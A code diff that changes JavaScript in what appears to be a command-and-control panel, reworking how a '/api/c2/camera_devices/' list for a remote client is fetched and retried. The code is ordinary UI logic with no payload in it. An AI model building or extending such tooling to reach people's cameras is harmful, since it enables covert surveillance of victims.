@@ -1090,30 +1090,28 @@
 
         const camSelect = document.getElementById('cam-select');
 
+        let camDevicesLoaded = false;
         async function loadCameraDevices() {
-            if (!camSelect) return;
-            for (let attempt = 0; attempt < 5; attempt++) {
-                try {
-                    const res = await fetch('/api/c2/camera_devices/' + encodeURIComponent(clientId));
-                    if (res.ok) {
-                        const devices = await res.json();
-                        if (devices && devices.length > 0) {
-                            camSelect.innerHTML = '';
-                            devices.forEach(d => {
-                                const opt = document.createElement('option');
-                                opt.value = d.id;
-                                opt.textContent = d.name;
-                                camSelect.appendChild(opt);
-                            });
-                            return;
-                        }
+            if (!camSelect || camDevicesLoaded) return;
+            try {
+                const res = await fetch('/api/c2/camera_devices/' + encodeURIComponent(clientId));
+                if (res.ok) {
+                    const devices = await res.json();
+                    if (devices && devices.length > 0) {
+                        camSelect.innerHTML = '';
+                        devices.forEach(d => {
+                            const opt = document.createElement('option');
+                            opt.value = d.id;
+                            opt.textContent = d.name;
+                            camSelect.appendChild(opt);
+                        });
+                        camDevicesLoaded = true;
+                        return;
                     }
-                } catch {}
-                await new Promise(r => setTimeout(r, 1000));
-            }
-            if (camSelect.options.length === 1 && camSelect.options[0].textContent === 'Scanning devices...') {
-                camSelect.innerHTML = '<option value="0">Camera #0 (Default)</option>';
-            }
+                }
+            } catch {}
+            // still no devices — retry in 2s (server requested list from client, waiting for response)
+            setTimeout(loadCameraDevices, 2000);
         }
 
         loadCameraDevices();
